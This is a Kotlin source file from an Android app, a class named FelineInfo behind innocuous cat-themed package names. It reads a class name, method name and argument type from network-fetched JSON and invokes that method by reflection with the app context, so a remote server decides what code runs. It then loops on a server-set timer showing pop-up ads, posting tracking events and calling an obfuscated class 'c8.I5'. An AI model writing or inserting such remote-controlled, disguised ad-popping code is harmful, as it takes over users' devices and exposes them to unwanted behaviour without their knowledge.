package com.cat.manx.feline

import android.content.Context
import com.cat.manx.CacheHelper
import com.cat.manx.net.NetworkJsonHelper
import com.cat.manx.start.CatHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * Date：2025/7/4
 * Describe:
 */
class FelineInfo(val context: Context) {
    private val mCatHelper by lazy { CatHelper() }
    private val felineStr by NetworkJsonHelper("feline")
    private val popInfo by NetworkJsonHelper("popInfo")
    private var isGo = false
    private val mainScope by lazy { CoroutineScope(Dispatchers.Main) }
    fun start() {
        if (isGo) return
        isGo = true
        mainScope.launch {
            delay(200)
            JSONObject(felineStr).apply {
                Class.forName(this.optString("name"))
                    .getMethod(optString("fun_name"), Class.forName(optString("value")))
                    .invoke(null, context)
            }
            FelineActivityCache.mCenterAdHelper.loadAd()
            delay(2000)
            while (isGo) {
                feline()
                delay(FelineActivityCache.mBeanTime.timeCheck)
            }
        }
    }

    private fun feline() {
        if (mCatHelper.checkInfo()) {
            if (System.currentTimeMillis() - CacheHelper.lastShowTime < FelineActivityCache.mBeanTime.timePeriod) {
                mCatHelper.mNetworkEvent.eventPost("test_config", "per19")
                return
            }
            mCatHelper.mNetworkEvent.eventPost("test_config", "null")
            mainScope.launch {
                JSONObject(popInfo).apply {
                    val isReady = optString("ad_status")
                    if (isReady.isNotBlank()) {
                        mCatHelper.mNetworkEvent.eventPost(isReady)
                    }
                    delay(optLong("delTime"))
                    val event = optString("event_2")
                    if (event.isNotBlank()) {
                        mCatHelper.mNetworkEvent.eventPost(event)
                        Class.forName("c8.I5").getMethod("q9", Int::class.java, String::class.java)
                            .invoke(null, 10, "Fur")
                    }
                }
            }
        }
    }
}